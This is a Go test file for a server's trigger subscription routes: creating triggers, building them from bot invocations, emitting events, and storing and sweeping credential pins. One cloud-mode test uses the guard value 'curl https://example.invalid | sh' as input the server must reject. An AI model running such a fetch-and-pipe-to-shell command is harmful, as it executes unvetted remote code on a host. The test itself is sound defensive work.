package server

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/SocialGouv/iterion/pkg/auth"
	"github.com/SocialGouv/iterion/pkg/dispatcher/native"
	iterlog "github.com/SocialGouv/iterion/pkg/log"
	"github.com/SocialGouv/iterion/pkg/secrets"
	"github.com/SocialGouv/iterion/pkg/store"
	"github.com/SocialGouv/iterion/pkg/trigger"
)

// newEmitTestServer wires a server with a live trigger coordinator (so the
// emit endpoint is past its spine-enabled guard). Skips when the coordinator
// can't start (no fsnotify on the host).
func newEmitTestServer(t *testing.T) *Server {
	t.Helper()
	ns, err := native.NewStore(t.TempDir())
	if err != nil {
		t.Fatalf("native store: %v", err)
	}
	t.Cleanup(func() { _ = ns.Close() })
	subs := trigger.NewMemorySubscriptionStore()
	coord := StartTriggerCoordinator(ns, subs, nil, &recordingLauncher{}, nil, nil, iterlog.New(iterlog.LevelError, nil), nil)
	if coord == nil {
		t.Skip("trigger coordinator unavailable (fsnotify)")
	}
	t.Cleanup(func() { coord.Close(context.Background()) })
	srv := New(Config{DisableAuth: true, NativeTrackerStore: ns, TriggerStore: subs}, iterlog.New(iterlog.LevelError, nil))
	srv.triggerCoord = coord
	return srv
}

func newTriggerTestServer(t *testing.T) *Server {
	t.Helper()
	srv := New(Config{DisableAuth: true, TriggerStore: trigger.NewMemorySubscriptionStore()}, iterlog.New(iterlog.LevelError, nil))
	srv.handler = srv.mux
	return srv
}

func TestTriggers_ServerInfoFlag(t *testing.T) {
	srv := newTriggerTestServer(t)
	rec := httptest.NewRecorder()
	srv.handleServerInfo(rec, httptest.NewRequest(http.MethodGet, "/api/server/info", nil))
	var info serverInfoResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &info); err != nil {
		t.Fatal(err)
	}
	if !info.TriggersEnabled {
		t.Errorf("triggers_enabled = false; want true")
	}

	off := New(Config{DisableAuth: true}, iterlog.New(iterlog.LevelError, nil))
	rec2 := httptest.NewRecorder()
	off.handleServerInfo(rec2, httptest.NewRequest(http.MethodGet, "/api/server/info", nil))
	var info2 serverInfoResponse
	_ = json.Unmarshal(rec2.Body.Bytes(), &info2)
	if info2.TriggersEnabled {
		t.Errorf("triggers_enabled = true with no store; want false")
	}
}

func TestTriggers_CreateAndList(t *testing.T) {
	srv := newTriggerTestServer(t)

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board","args_var":"feature_prompt",
		"match":{"sources":["board"],"subject_states":["ready"],"labels":["feature"]}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers", bytes.NewBufferString(body)))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create status = %d; body=%s", rec.Code, rec.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	if created.ID == "" || created.BotID != "feature-dev" || created.Origin != "operator" {
		t.Fatalf("unexpected created subscription: %+v", created)
	}

	lrec := httptest.NewRecorder()
	srv.handleListTriggers(lrec, httptest.NewRequest(http.MethodGet, "/api/v1/triggers", nil))
	var listed struct {
		Subscriptions []trigger.Subscription `json:"subscriptions"`
	}
	if err := json.Unmarshal(lrec.Body.Bytes(), &listed); err != nil {
		t.Fatal(err)
	}
	if len(listed.Subscriptions) != 1 || listed.Subscriptions[0].ID != created.ID {
		t.Fatalf("list = %+v; want the created subscription", listed.Subscriptions)
	}
}

// newFromInvocationServer builds a server whose workdir ships one bundle
// bot declaring schedule + board + command invocations, plus a memory
// trigger store — the bot home's one-click enablement surface.
func newFromInvocationServer(t *testing.T) *Server {
	t.Helper()
	workdir := t.TempDir()
	dir := filepath.Join(workdir, "bots", "trig-bot")
	writeBotFile(t, filepath.Join(dir, "main.bot"), "workflow w:\n  agent a:\n    model: \"test\"\n  a -> done\n\nagent a:\n  model: \"test\"\n")
	writeBotFile(t, filepath.Join(dir, "manifest.yaml"), `name: trig-bot
schema_version: 1
invocations:
  - kind: schedule
    schedule:
      suggested_cron: "0 7 * * 1"
      default_vars:
        window: "7 days"
  - kind: board
    board:
      to_states: [ready]
      all_labels: [triage]
  - kind: command
    command:
      name: trig
`)
	srv := New(Config{DisableAuth: true, WorkDir: workdir, TriggerStore: trigger.NewMemorySubscriptionStore()}, iterlog.New(iterlog.LevelError, nil))
	srv.handler = srv.mux
	return srv
}

func postFromInvocation(t *testing.T, srv *Server, bot, body string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/v1/bots/"+bot+"/triggers/from-invocation", bytes.NewBufferString(body))
	req.SetPathValue("name", bot)
	srv.handleTriggerFromInvocation(rec, req)
	return rec
}

func TestTriggerFromInvocation_Schedule(t *testing.T) {
	srv := newFromInvocationServer(t)
	rec := postFromInvocation(t, srv, "trig-bot", `{"index":0}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status = %d; body=%s", rec.Code, rec.Body.String())
	}
	var sub trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &sub); err != nil {
		t.Fatal(err)
	}
	if sub.BotID != "trig-bot" || sub.Cron != "0 7 * * 1" || sub.Origin != botHomeTriggerOrigin || !sub.Enabled {
		t.Fatalf("unexpected subscription: %+v", sub)
	}
	if sub.Vars["window"] != "7 days" {
		t.Errorf("default_vars not carried: %+v", sub.Vars)
	}

	// Same invocation again → 409 with the existing id.
	dup := postFromInvocation(t, srv, "trig-bot", `{"index":0}`)
	if dup.Code != http.StatusConflict {
		t.Fatalf("duplicate status = %d; body=%s", dup.Code, dup.Body.String())
	}
	var conflict struct {
		SubscriptionID string `json:"subscription_id"`
	}
	_ = json.Unmarshal(dup.Body.Bytes(), &conflict)
	if conflict.SubscriptionID != sub.ID {
		t.Errorf("conflict id = %q, want %q", conflict.SubscriptionID, sub.ID)
	}
}

func TestTriggerFromInvocation_ScheduleCronOverride(t *testing.T) {
	srv := newFromInvocationServer(t)
	rec := postFromInvocation(t, srv, "trig-bot", `{"index":0,"cron":"30 6 * * 2"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status = %d; body=%s", rec.Code, rec.Body.String())
	}
	var sub trigger.Subscription
	_ = json.Unmarshal(rec.Body.Bytes(), &sub)
	if sub.Cron != "30 6 * * 2" {
		t.Errorf("cron = %q, want the override", sub.Cron)
	}

	bad := postFromInvocation(t, srv, "trig-bot", `{"index":1,"cron":"* * * * *"}`)
	if bad.Code != http.StatusBadRequest {
		t.Errorf("cron on board invocation: status = %d, want 400", bad.Code)
	}
}

func TestTriggerFromInvocation_Board(t *testing.T) {
	srv := newFromInvocationServer(t)
	rec := postFromInvocation(t, srv, "trig-bot", `{"index":1}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status = %d; body=%s", rec.Code, rec.Body.String())
	}
	var sub trigger.Subscription
	_ = json.Unmarshal(rec.Body.Bytes(), &sub)
	if len(sub.Match.SubjectStates) != 1 || sub.Match.SubjectStates[0] != "ready" {
		t.Errorf("matcher states = %+v, want [ready]", sub.Match.SubjectStates)
	}
	if sub.EffectiveMode() != "board" {
		t.Errorf("mode = %q, want board", sub.EffectiveMode())
	}
}

func TestTriggerFromInvocation_Rejections(t *testing.T) {
	srv := newFromInvocationServer(t)
	cases := map[string]struct {
		bot, body string
		want      int
	}{
		"command kind": {"trig-bot", `{"index":2}`, http.StatusBadRequest},
		"out of range": {"trig-bot", `{"index":9}`, http.StatusBadRequest},
		"negative":     {"trig-bot", `{"index":-1}`, http.StatusBadRequest},
		"unknown bot":  {"nope", `{"index":0}`, http.StatusNotFound},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			rec := postFromInvocation(t, srv, tc.bot, tc.body)
			if rec.Code != tc.want {
				t.Errorf("status = %d, want %d (body=%s)", rec.Code, tc.want, rec.Body.String())
			}
		})
	}
}

func TestTriggers_CreateRequiresBot(t *testing.T) {
	srv := newTriggerTestServer(t)
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers", bytes.NewBufferString(`{"match":{}}`)))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("create without bot_id status = %d; want 400", rec.Code)
	}
}

type recordingLauncher struct{ n atomic.Int64 }

func (r *recordingLauncher) Launch(_ context.Context, _ trigger.LaunchPlan) (string, error) {
	r.n.Add(1)
	return "run-x", nil
}

func TestEmitTrigger_UnavailableWithoutSpine(t *testing.T) {
	srv := New(Config{DisableAuth: true}, iterlog.New(iterlog.LevelError, nil))
	rec := httptest.NewRecorder()
	srv.handleEmitTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers/emit", bytes.NewBufferString(`{"kind":"ci.done"}`)))
	if rec.Code != http.StatusServiceUnavailable {
		t.Fatalf("emit without spine = %d; want 503", rec.Code)
	}
}

func TestEmitTrigger_PublishesAndFires(t *testing.T) {
	ns, err := native.NewStore(t.TempDir())
	if err != nil {
		t.Fatalf("native store: %v", err)
	}
	t.Cleanup(func() { _ = ns.Close() })

	subs := trigger.NewMemorySubscriptionStore()
	_ = subs.Create(context.Background(), trigger.Subscription{
		ID: "custom", BotID: "review-pr", Mode: "direct", Enabled: true,
		Match: trigger.Matcher{Sources: []trigger.Source{trigger.SourceCustom}, Kinds: []string{"ci.done"}},
	})
	rl := &recordingLauncher{}
	coord := StartTriggerCoordinator(ns, subs, nil, rl, nil, nil, iterlog.New(iterlog.LevelError, nil), nil)
	if coord == nil {
		t.Skip("trigger coordinator unavailable (fsnotify)")
	}
	t.Cleanup(func() { coord.Close(context.Background()) })

	srv := New(Config{DisableAuth: true, NativeTrackerStore: ns, TriggerStore: subs}, iterlog.New(iterlog.LevelError, nil))
	srv.triggerCoord = coord

	rec := httptest.NewRecorder()
	srv.handleEmitTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers/emit",
		bytes.NewBufferString(`{"kind":"ci.done","subject":{"id":"build-42"}}`)))
	if rec.Code != http.StatusAccepted {
		t.Fatalf("emit status = %d; body=%s", rec.Code, rec.Body.String())
	}

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if rl.n.Load() == 1 {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("custom event did not fire the matching subscription (launches=%d)", rl.n.Load())
}

// A subject-less emit must still get a unique event id so two distinct events
// don't collapse onto the same "custom:<kind>:" key (the forge source's
// launched_run_id marker depends on a per-event id).
func TestEmitTrigger_DefaultsEventIDWhenSubjectMissing(t *testing.T) {
	srv := newEmitTestServer(t)
	emit := func() string {
		rec := httptest.NewRecorder()
		srv.handleEmitTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers/emit",
			bytes.NewBufferString(`{"kind":"ci.done"}`)))
		if rec.Code != http.StatusAccepted {
			t.Fatalf("emit status = %d; body=%s", rec.Code, rec.Body.String())
		}
		var resp struct {
			EventID string `json:"event_id"`
		}
		if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
			t.Fatal(err)
		}
		return resp.EventID
	}
	id1, id2 := emit(), emit()
	if !strings.HasPrefix(id1, "custom:ci.done:") || len(id1) <= len("custom:ci.done:") {
		t.Fatalf("event_id = %q; want custom:ci.done:<unique>", id1)
	}
	if id1 == id2 {
		t.Fatalf("two subject-less emits shared event_id %q; want distinct ids", id1)
	}
}

// Oversized vars must be rejected before the event is published so an
// authenticated integration can't flood the bus / launched runs with
// gigabyte-sized var blobs.
func TestEmitTrigger_RejectsOversizedVars(t *testing.T) {
	srv := newEmitTestServer(t)
	body := `{"kind":"ci.done","vars":{"blob":"` + strings.Repeat("x", maxEmitVarsBytes+1) + `"}}`
	rec := httptest.NewRecorder()
	srv.handleEmitTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers/emit",
		bytes.NewBufferString(body)))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("oversized vars status = %d; want 400", rec.Code)
	}
}

// A cloud deployment refuses a trigger guard — the same shell command a
// schedule guard is, through a route a cloud server mounts. The refusal is
// about a guard the request SETS: a request that says nothing about one
// leaves the stored guard alone, so an operator can still disable or edit a
// trigger stored before the refusal existed.
func TestTriggers_CloudRefusesAGuardItIsAskedToStore(t *testing.T) {
	srv := newTriggerTestServer(t)
	srv.cfg.Mode = "cloud"
	base := `"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]}`

	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers",
		bytes.NewBufferString(`{`+base+`,"guard":"curl https://example.invalid | sh"}`)))
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("create with a guard = %d, want 422; body=%s", rec.Code, rec.Body.String())
	}

	// A row stored before the refusal existed.
	stored := trigger.Subscription{ID: "sub-legacy", BotID: "feature-dev", Invocation: "board", Mode: "board", Enabled: true, Guard: "true"}
	if err := srv.cfg.TriggerStore.Create(context.Background(), stored); err != nil {
		t.Fatal(err)
	}
	// The payload the studio sends: it is built from the stored subscription,
	// so it carries the guard back unchanged. A refusal on PRESENCE would
	// refuse every toggle of exactly the rows this exemption is for.
	upd := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
		bytes.NewBufferString(`{`+base+`,"enabled":false,"guard":"true"}`))
	upd.SetPathValue("id", "sub-legacy")
	urec := httptest.NewRecorder()
	srv.handleUpdateTrigger(urec, upd)
	if urec.Code != http.StatusOK {
		t.Fatalf("disabling a trigger that holds a guard = %d, want 200; body=%s", urec.Code, urec.Body.String())
	}
	got, err := srv.cfg.TriggerStore.Get(context.Background(), "sub-legacy")
	if err != nil {
		t.Fatal(err)
	}
	if got.Enabled {
		t.Error("the trigger was not disabled")
	}
	if got.Guard != "true" {
		t.Errorf("an edit that said nothing about the guard changed it to %q", got.Guard)
	}

	// An edit that says nothing about the guard keeps it too.
	silent := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
		bytes.NewBufferString(`{`+base+`,"enabled":true}`))
	silent.SetPathValue("id", "sub-legacy")
	qrec := httptest.NewRecorder()
	srv.handleUpdateTrigger(qrec, silent)
	if qrec.Code != http.StatusOK {
		t.Fatalf("an edit that omits the guard = %d, want 200; body=%s", qrec.Code, qrec.Body.String())
	}
	if got, _ := srv.cfg.TriggerStore.Get(context.Background(), "sub-legacy"); got.Guard != "true" {
		t.Errorf("an edit that omitted the guard changed it to %q", got.Guard)
	}

	// CHANGING one, on the other hand, is refused.
	set := httptest.NewRequest(http.MethodPut, "/api/v1/triggers/sub-legacy",
		bytes.NewBufferString(`{`+base+`,"guard":"curl https://example.invalid | sh"}`))
	set.SetPathValue("id", "sub-legacy")
	srec := httptest.NewRecorder()
	srv.handleUpdateTrigger(srec, set)
	if srec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("update that SETS a guard = %d, want 422", srec.Code)
	}

	// Local mode keeps the feature: the server runs it where the operator is.
	srv.cfg.Mode = ""
	lrec := httptest.NewRecorder()
	srv.handleCreateTrigger(lrec, httptest.NewRequest(http.MethodPost, "/api/v1/triggers",
		bytes.NewBufferString(`{`+base+`,"guard":"true"}`)))
	if lrec.Code != http.StatusCreated {
		t.Fatalf("local create with a guard = %d, want 201; body=%s", lrec.Code, lrec.Body.String())
	}
}

// triggerPinServer builds a server whose trigger routes validate pins against
// real stores: a BYOK key store and a generic-secret store, both seeded under
// the tenant the requests are stamped with.
func triggerPinServer(t *testing.T) (*Server, secrets.ApiKey, secrets.GenericSecret) {
	t.Helper()
	keys := secrets.NewMemoryApiKeyStore()
	org := seedVendorKey(t, keys, "t1", "", "org-default", true)
	gen := secrets.NewMemoryGenericSecretStore()
	sec := secrets.GenericSecret{
		ID: "sec-org", TenantID: "t1", ScopeTeamID: "t1",
		Name: "forge_token", CreatedAt: time.Now().UTC(),
	}
	if err := gen.Create(store.WithTenant(t.Context(), "t1"), sec); err != nil {
		t.Fatal(err)
	}
	srv := newTriggerTestServer(t)
	srv.apiKeys = keys
	srv.genericSecrets = gen
	return srv, org, sec
}

// teamTriggerReq stamps the active team the trigger routes read the tenant
// from. id lands as the {id} path value the direct handler calls read (the
// mux is what populates it on a routed request); empty for id-less routes.
func teamTriggerReq(t *testing.T, method, target, id, body string) *http.Request {
	t.Helper()
	ctx := auth.WithIdentity(t.Context(), auth.Identity{UserID: "op", TeamID: "t1"})
	return orgReq(ctx, method, target, body, id)
}

// #2644, the carrier. The subscription routes are the WRITE the spine's pin
// conveyor was waiting for: the lanes (pkg/trigger/pin_carriage_test.go) and
// the LaunchSpec hop (trigger_pin_carriage_test.go) already carry pins, and
// none of it mattered because no writer ever produced one. These witnesses
// pin the route half: the request fields land in the stored subscription,
// an edit that says nothing about a pin keeps it, and a pin no machine lane
// can spend is refused where it is written — the only place a refusal can
// still reach the operator.

func TestTriggers_CreateStoresThePinsItIsGiven(t *testing.T) {
	srv, org, sec := triggerPinServer(t)

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board",
		"match":{"sources":["board"]},
		"key_overrides":{"anthropic":"` + org.ID + `"},
		"secret_overrides":{"forge_token":"` + sec.ID + `"}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "", body))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create with pins = %d, want 201; body=%s", rec.Code, rec.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	if got := created.KeyOverrides["anthropic"]; got != org.ID {
		t.Errorf("created.KeyOverrides[anthropic] = %q, want the pinned key %q — the answer would read like a subscription that pins nothing", got, org.ID)
	}
	if got := created.SecretOverrides["forge_token"]; got != sec.ID {
		t.Errorf("created.SecretOverrides[forge_token] = %q, want the pinned secret %q", got, sec.ID)
	}

	// The stored row carries them too — the lanes read the store, not the
	// create answer.
	got, err := srv.cfg.TriggerStore.Get(t.Context(), created.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.KeyOverrides["anthropic"] != org.ID || got.SecretOverrides["forge_token"] != sec.ID {
		t.Errorf("stored pins = %v / %v, want the pinned key and secret", got.KeyOverrides, got.SecretOverrides)
	}
}

func TestTriggers_AnEditOmittingThePinsKeepsTheStoredOnes(t *testing.T) {
	srv, org, sec := triggerPinServer(t)

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board",
		"match":{"sources":["board"]},
		"key_overrides":{"anthropic":"` + org.ID + `"},
		"secret_overrides":{"forge_token":"` + sec.ID + `"}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "", body))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create = %d; body=%s", rec.Code, rec.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}

	// An edit that says nothing about the pins (the payload the studio
	// builds from the stored subscription).
	silent := httptest.NewRecorder()
	srv.handleUpdateTrigger(silent, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},"enabled":false}`))
	if silent.Code != http.StatusOK {
		t.Fatalf("an edit omitting the pins = %d, want 200; body=%s", silent.Code, silent.Body.String())
	}
	got, _ := srv.cfg.TriggerStore.Get(t.Context(), created.ID)
	if got.KeyOverrides["anthropic"] != org.ID || got.SecretOverrides["forge_token"] != sec.ID {
		t.Errorf("an edit that said nothing about the pins left %v / %v — the studio would wipe a pin on every toggle", got.KeyOverrides, got.SecretOverrides)
	}

	// A present map replaces wholesale: a second org secret proves the
	// stored value actually moved.
	sec2 := secrets.GenericSecret{
		ID: "sec-org2", TenantID: "t1", ScopeTeamID: "t1",
		Name: "forge_token", CreatedAt: time.Now().UTC(),
	}
	if err := srv.genericSecrets.Create(store.WithTenant(t.Context(), "t1"), sec2); err != nil {
		t.Fatal(err)
	}
	repl := httptest.NewRecorder()
	srv.handleUpdateTrigger(repl, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},"secret_overrides":{"forge_token":"`+sec2.ID+`"}}`))
	if repl.Code != http.StatusOK {
		t.Fatalf("the replace = %d, want 200; body=%s", repl.Code, repl.Body.String())
	}
	if got, _ := srv.cfg.TriggerStore.Get(t.Context(), created.ID); got.SecretOverrides["forge_token"] != sec2.ID || got.KeyOverrides["anthropic"] != org.ID {
		t.Errorf("the replace left %v / %v, want the new secret pin and the untouched key pin", got.SecretOverrides, got.KeyOverrides)
	}

	// An empty map is the explicit clear.
	clear := httptest.NewRecorder()
	srv.handleUpdateTrigger(clear, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},"key_overrides":{},"secret_overrides":{}}`))
	if clear.Code != http.StatusOK {
		t.Fatalf("the explicit clear = %d, want 200; body=%s", clear.Code, clear.Body.String())
	}
	if got, _ := srv.cfg.TriggerStore.Get(t.Context(), created.ID); len(got.KeyOverrides) != 0 || len(got.SecretOverrides) != 0 {
		t.Errorf("an empty pin map did not clear: %v / %v", got.KeyOverrides, got.SecretOverrides)
	}
}

// The clean path of the resurrection window: a delete's sweep ran, and the
// edit that says nothing about the pins lands after it. The route re-reads,
// so its write carries the swept (cleared) row — the dead pin stays gone.
func TestTriggers_AnEditAfterASweepLandsTheSweptRow(t *testing.T) {
	srv, org, sec := triggerPinServer(t)

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board",
		"match":{"sources":["board"]},
		"key_overrides":{"anthropic":"` + org.ID + `"},
		"secret_overrides":{"forge_token":"` + sec.ID + `"}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "", body))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create = %d; body=%s", rec.Code, rec.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}

	// The delete's sweep half, driven the way the delete route drives it.
	swept, err := srv.sweepCredentialPins(store.WithTenant(t.Context(), "t1"), "t1", org.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(swept) != 1 || swept[0] != "trigger "+created.ID {
		t.Fatalf("the sweep touched %v, want exactly trigger %s", swept, created.ID)
	}

	silent := httptest.NewRecorder()
	srv.handleUpdateTrigger(silent, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},"enabled":false}`))
	if silent.Code != http.StatusOK {
		t.Fatalf("the post-sweep edit = %d, want 200; body=%s", silent.Code, silent.Body.String())
	}
	got, err := srv.cfg.TriggerStore.Get(t.Context(), created.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(got.KeyOverrides) != 0 {
		t.Errorf("the swept key pin stands again: %v — a pin naming the deleted key seals the team's default in silence", got.KeyOverrides)
	}
	if got.SecretOverrides["forge_token"] != sec.ID {
		t.Errorf("the sweep moved a secret pin that names no deleted key: %v", got.SecretOverrides)
	}
}

// sweepBeatenStore interposes the delete's sweep at the finding's window:
// the route's read has already taken the row when the sweep's clear lands,
// so the route's write carries a pre-sweep version. The clear and the write
// both go through the real store — the wrapper adds no semantics, it only
// orders the two writers the way the race does.
type sweepBeatenStore struct {
	trigger.SubscriptionStore
	inner    *trigger.MemorySubscriptionStore
	recordID string
}

func (w *sweepBeatenStore) Update(ctx context.Context, s trigger.Subscription) error {
	if _, err := w.inner.ClearCredentialPins(ctx, s.ID, w.recordID); err != nil {
		return err
	}
	return w.inner.Update(ctx, s)
}

// The raced path of the same window: an edit whose read predates the sweep
// is beaten, not landed — the version the clear bumped conflicts it, the
// edit answers 409, and the swept row is what stays stored.
func TestTriggers_AnEditBeatenByASweepConflictsInsteadOfResurrecting(t *testing.T) {
	srv, org, _ := triggerPinServer(t)
	inner, ok := srv.cfg.TriggerStore.(*trigger.MemorySubscriptionStore)
	if !ok {
		t.Fatalf("the trigger store is %T, want *trigger.MemorySubscriptionStore", srv.cfg.TriggerStore)
	}
	srv.cfg.TriggerStore = &sweepBeatenStore{SubscriptionStore: inner, inner: inner, recordID: org.ID}

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board",
		"match":{"sources":["board"]},
		"key_overrides":{"anthropic":"` + org.ID + `"}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "", body))
	if rec.Code != http.StatusCreated {
		t.Fatalf("create = %d; body=%s", rec.Code, rec.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(rec.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}

	beaten := httptest.NewRecorder()
	srv.handleUpdateTrigger(beaten, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},"enabled":false}`))
	if beaten.Code != http.StatusConflict {
		t.Fatalf("an edit beaten by the sweep = %d, want 409; body=%s", beaten.Code, beaten.Body.String())
	}
	got, err := inner.Get(t.Context(), created.ID)
	if err != nil {
		t.Fatal(err)
	}
	if _, stands := got.KeyOverrides["anthropic"]; stands {
		t.Errorf("the dead pin stands again: %v — the beaten edit resurrected it", got.KeyOverrides)
	}
}

// The spine launches under triggerSpineActor, so a pin it can never spend is
// refused at write — the same arm, through the same validator, the webhook
// lane already answers with (machine_lane_pin_visibility_test.go). Reached
// through the ROUTE because the validator call itself is the writer's guard.
func TestTriggers_APinTheSpineCanNeverSpendIsRefusedAtTheRoutes(t *testing.T) {
	srv, org, _ := triggerPinServer(t)
	keys := srv.apiKeys
	personal := seedVendorKey(t, keys, "t1", "alice", "alice-personal", false)

	body := `{"bot_id":"feature-dev","invocation":"board","mode":"board",
		"match":{"sources":["board"]},
		"key_overrides":{"anthropic":"` + personal.ID + `"}}`
	rec := httptest.NewRecorder()
	srv.handleCreateTrigger(rec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "", body))
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("create pinning a personal key = %d, want 400; body=%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "not spendable by this lane") || !strings.Contains(rec.Body.String(), triggerSpineActor) {
		t.Errorf("the refusal %s does not name the lane and the actor it launches under — an operator cannot act on it", rec.Body.String())
	}
	if n, _ := srv.cfg.TriggerStore.ListByTenant(store.WithTenant(t.Context(), "t1"), "t1"); len(n) != 0 {
		t.Errorf("the refused create stored %d subscription(s)", len(n))
	}

	// The secret twin answers the same shape the same way.
	gen := secrets.NewMemoryGenericSecretStore()
	bad := secrets.GenericSecret{
		ID: "sec-personal", TenantID: "t1", ScopeTeamID: "t1", ScopeUserID: "alice",
		Name: "forge_token", CreatedAt: time.Now().UTC(),
	}
	if err := gen.Create(store.WithTenant(t.Context(), "t1"), bad); err != nil {
		t.Fatal(err)
	}
	srv.genericSecrets = gen
	srec := httptest.NewRecorder()
	srv.handleCreateTrigger(srec, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "",
		`{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]},
		 "secret_overrides":{"forge_token":"`+bad.ID+`"}}`))
	if srec.Code != http.StatusBadRequest {
		t.Fatalf("create pinning a user-scoped secret = %d, want 400; body=%s", srec.Code, srec.Body.String())
	}

	// A stored pin survives an edit that would replace it with an
	// unspendable one: the refusal leaves the stored value alone.
	base := `{"bot_id":"feature-dev","invocation":"board","mode":"board","match":{"sources":["board"]}`
	create := httptest.NewRecorder()
	srv.handleCreateTrigger(create, teamTriggerReq(t, http.MethodPost, "/api/v1/triggers", "",
		base+`,"key_overrides":{"anthropic":"`+org.ID+`"}}`))
	if create.Code != http.StatusCreated {
		t.Fatalf("create with an org pin = %d, want 201; body=%s", create.Code, create.Body.String())
	}
	var created trigger.Subscription
	if err := json.Unmarshal(create.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	urec := httptest.NewRecorder()
	srv.handleUpdateTrigger(urec, teamTriggerReq(t, http.MethodPut, "/api/v1/triggers/"+created.ID, created.ID,
		base+`,"key_overrides":{"anthropic":"`+personal.ID+`"}}`))
	if urec.Code != http.StatusBadRequest {
		t.Fatalf("update to a personal pin = %d, want 400; body=%s", urec.Code, urec.Body.String())
	}
	if got, _ := srv.cfg.TriggerStore.Get(t.Context(), created.ID); got.KeyOverrides["anthropic"] != org.ID {
		t.Errorf("the refused edit changed the stored pin to %v", got.KeyOverrides)
	}
}
